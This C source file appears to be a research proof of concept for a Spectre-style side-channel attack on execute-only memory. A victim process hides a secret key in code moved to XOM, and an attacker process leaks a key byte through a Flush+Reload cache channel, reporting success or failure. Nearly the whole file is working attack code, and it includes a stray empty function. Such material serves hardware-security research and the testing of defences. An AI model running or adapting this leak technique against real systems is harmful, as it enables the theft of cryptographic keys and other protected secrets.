#define _GNU_SOURCE

#include <memory.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <unistd.h>
#include <sys/prctl.h>

#include "libxom.h"
#include "libcache/cacheutils.h"

#define RED "\e[0;31m"
#define GRN "\e[0;32m"
#define CRESET "\e[0m"
#define STR_OK "[" GRN "+" CRESET "] "
#define STR_FAIL "[" RED "-" CRESET "] "

#define NUM_ATTEMPTS    10
#define NUM_SUCCESSES   3

#define SECRET          0xdadadadadadadada

pid_t is_child;

extern unsigned long perform_encryption(unsigned long plain, unsigned long key, void* _unused, unsigned long stall_time);
extern unsigned long victim(unsigned long plain);
extern unsigned long attacker(void* mem);

void _cache_encode(unsigned char data) {
  maccess(mem + data * pagesize);
}

_Noreturn void __attribute__((noinline)) victim_loop(void){
    // The victim just repeatedly calls the encryption function
    for(;;) {
        nospec();
        victim(0xcafebabecafebabe);
    }
}

_Noreturn void  attacker_loop(){
    unsigned int counter = 0, success_counter = 0;
    for(;;){
        flush_shared_memory();
        nospec();

        // Repeatedly execute attacker
        for(unsigned i = 0; i < 500; i++)
            attacker(mem);

        // Recover data from covert channel
        for (int i = 0; i < 256; i++) {
            int mix_i = ((i * 167) + 13) & 255; // avoid prefetcher
            if (flush_reload(mem + mix_i * pagesize)) {
                if (mix_i != 0) {
                    counter++;
                    if(mix_i == 0xda)
                        success_counter++;

                    printf("0x%02x   ", (uint8_t) mix_i);
                    fflush(stdout);

                    if(counter > NUM_ATTEMPTS)
                        goto quit;
                }
            }
        }
    }
    quit:

    if(success_counter >= NUM_SUCCESSES)
        printf("\n" STR_OK "Successfully leaked a key byte!\n");
    else
        printf("\n" STR_FAIL "Failed to leak a key byte!\n");

    kill(getppid(), SIGTERM);
    exit(0);
}


static uint8_t spectre_isb_sa_ip_test_generic() {

}

int main() {
    char *_mem;
    uint64_t key = 0;
    // Location of the key value in code
    uint8_t* key_ptr = (&((uint8_t*)perform_encryption)[2]);

    pagesize = sysconf(_SC_PAGESIZE);
    // Detect cache threshold
    if (!CACHE_MISS)
        CACHE_MISS = detect_flush_reload_threshold();
    printf("[\x1b[33m*\x1b[0m] Flush+Reload Threshold: \x1b[33m%zd\x1b[0m\n", CACHE_MISS);
    printf("[\x1b[33m*\x1b[0m] We are looking for the secret key byte \x1b[33m0x%02x\x1b[0m!\n", (uint8_t)(SECRET & 0xff));
    printf("[\x1b[33m*\x1b[0m] If it gets leaked at least \x1b[33m%u\x1b[0m out of \x1b[33m%u\x1b[0m times,"
           " we consider the attack successful!\n", NUM_SUCCESSES, NUM_ATTEMPTS);

    // Allocate Flush+Reload buffer
    _mem = malloc(pagesize * (256 + 4));
    mem = (char *) (((size_t) _mem & ~(pagesize - 1)) + pagesize * 2);
    memset(mem, 0, pagesize * 256);

    // Make ASM code writable so that we can overwrite the key
    mprotect(perform_encryption, 0x1000, PROT_READ | PROT_WRITE | PROT_EXEC);

    is_child = fork();
    if(!is_child){
        // Attacker process

        // Terminate when out parent terminates
        prctl(PR_SET_PDEATHSIG, SIGHUP);

        // Set the key to zero
        memcpy(key_ptr, &key, sizeof(key));

        attacker_loop();
    }

    // Victim process
    // This is the secret key
    // We overwrite the key specified in spectre_asm.s, and then migrate our code into XOM
    // so that it cannot be read again
    key = SECRET;
    memcpy(key_ptr, &key, sizeof(key));
    xom_migrate_all_code();

    victim_loop();
}
